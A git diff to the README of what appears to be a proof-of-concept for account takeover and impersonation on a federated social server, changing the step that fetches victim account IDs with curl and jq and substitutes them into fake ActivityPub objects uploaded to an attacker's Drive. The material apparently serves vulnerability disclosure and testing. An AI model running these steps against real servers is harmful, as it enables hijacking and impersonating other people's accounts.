@@ -22,18 +22,14 @@ docker-compose up -d
 
 ### Prepare fake documents
 
-First, execute the following command to get the Activity Streams actor URIs of the victim accounts:
+First, execute the following commands to get the user IDs of the victim accounts:
 
-```console
-$ curl -K ../assets/curlrc -fH 'Accept: application/activity+json' 'https://victim.poc.example/@takeoverVictim' | jq -r '.id'
-https://victim.poc.example/users/deadbeef1
-$ curl -K ../assets/curlrc -fH 'Accept: application/activity+json' 'https://victim.poc.example/@impersonationVictim' | jq -r '.id'
-https://victim.poc.example/users/deadbeef2
+```sh
+curl -K ../assets/curlrc -fH 'Accept: application/activity+json' 'https://victim.poc.example/@takeoverVictim' | jq -r '.id' | sed 's!.*/!!' > takeoverVictim-id.txt
+curl -K ../assets/curlrc -fH 'Accept: application/activity+json' 'https://victim.poc.example/@impersonationVictim' | jq -r '.id' | sed 's!.*/!!' > impersonationVictim-id.txt
 ```
 
-Take notes of these URIs as they are used in the next steps.
-
-Next, upload the following fake object files to `@attacker@victim.poc.example`'s Drive and take note of the resulting Drive URLs. Before uploading the files, you need to replace the placeholder actor URIs with the actual ones (e.g. `sed 's/deadbeef1/[actual ID of @takeoverVictim]/g; s/deadbeef2/[actual ID of @impersonationVictim]/g'`).
+Next, upload the following fake object files to `@attacker@victim.poc.example`'s Drive and take note of the resulting Drive URLs. Before uploading the files, you need to replace the placeholder actor URIs with the actual ones (e.g. `sed "s/deadbeef1/$(cat takeoverVictim-id.txt)/g; s/deadbeef2/$(cat impersonationVictim-id.txt)/g"`).
 
 ```json
 {
